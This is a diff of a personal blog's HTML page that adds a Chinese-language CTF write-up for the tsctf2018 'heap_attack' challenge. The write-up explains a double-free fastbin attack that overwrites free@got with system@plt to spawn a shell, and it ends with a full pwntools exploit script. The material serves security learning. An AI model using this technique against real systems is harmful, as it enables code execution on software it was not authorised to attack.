@@ -304,6 +304,190 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/07/heap_attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Talking is cheap, show me the code.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/07/heap_attack/" itemprop="url">
+                  tsctf-HeapAttack
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-01-07 14:35:41" itemprop="dateCreated datePublished" datetime="2019-01-07T14:35:41+08:00">2019-01-07</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/tsctf2018/" itemprop="url" rel="index"><span itemprop="name">tsctf2018</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/07/heap_attack/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/01/07/heap_attack/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/01/07/heap_attack/" class="leancloud_visitors" data-flag-title="tsctf-HeapAttack">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="tsctf2018-gt-heap-attack"><a href="#tsctf2018-gt-heap-attack" class="headerlink" title="tsctf2018-&gt;heap_attack"></a>tsctf2018-&gt;heap_attack</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近终于磨蹭到了堆的漏洞，刚看完fastbin attack，准备先停一下，做几个题巩固一下，这里的heap_attack是一道比较典型的double free的题目，记录一下</p>
+<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序一共有三个功能，新建block，编辑block和删除block，这次跟之前做的几道题不太一样的是没有输出函数和溢出漏洞，寻摸了半天也没找到。</p>
+<p><img src="/2019/01/07/heap_attack/1.jpg" alt="main"><br><img src="/2019/01/07/heap_attack/2.jpg" alt="newblock"><br><img src="/2019/01/07/heap_attack/3.jpg" alt="delete"><br><img src="/2019/01/07/heap_attack/4.jpg" alt="edit"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在删除这里只是free了堆块，没有清零，存在uaf和double free，这里虽然没有可以泄露函数地址的打印功能，但是程序里有个echo函数给了system地址，以前输入可以溢出的时候可以用uaf构造unlink，现在没有的话就考虑单纯的double free。</p>
+<h2 id="数据构造"><a href="#数据构造" class="headerlink" title="数据构造"></a>数据构造</h2><p>新建四个堆块，其中最后一个堆块的内容是’/bin/sh\x00’，第0个堆块的作用是初始化堆。依次删除第一个堆块，第二个堆块，第一个堆块，此时的Bins结果可以看到：<br>main_arena-&gt;chunk_1-&gt;chunk_2-&gt;chunk1<br>再Add(fake_chunk_addr)，使得free bins的指针链表变成：<br>main_arena-&gt;chunk_2-&gt;chunk1-&gt;fake_chunk_addr<br>我们希望这个fake_chunk分配到全局变量s的低地址处且长度为0x70，从而可以覆盖s[i]为free@got，进一步edit即可使得system@plt覆盖free@got，这里使用pwndbg的find_fake_fast,选择一个离s比较近的0x6020bd，Add(p64(0x6020bd))即可</p>
+<p><img src="/2019/01/07/heap_attack/5.jpg" alt="fake_chunk"></p>
+<p>Add一次，分配的是chunk_2，再Add一次，分配的是chunk_1，再Add一次，分配的是fake_chunk_addr，这里它和s的距离为0x23,输入部分相距0x13，故先填充0x13的’a’，加上free@got即可让s[0]为free@got，再edit(0)覆盖其为system@plt，最后free(chunk3)触发system(‘/bin/sh’)</p>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">context.log_level = <span class="string">"DEBUG"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">'./heap_attack'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./heap_attack'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Input ur choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Input content:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Input ur choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Input ur choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Input content:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>) </span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>) </span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'/bin/sh\x00'</span>) </span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'double free'</span></span><br><span class="line">Add(<span class="number">0x60</span>, p64(<span class="number">0x6020bd</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'add 1'</span></span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'add 2'</span></span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'add 1 again'</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">Add(<span class="number">0x60</span>, <span class="string">'a'</span> * <span class="number">19</span> + p64(free_got)) </span><br><span class="line">Edit(<span class="number">0</span>, <span class="string">'\xb0\x07\x40\x00\x00\x00'</span>)<span class="comment">#not p64(system_plt) for the length is 6</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'over flow'</span></span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/起点/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2049,7 +2233,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-count">10</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2074,7 +2258,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">6</span>
+                      
+                    
+                    <span class="site-state-item-count">7</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -2116,7 +2302,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
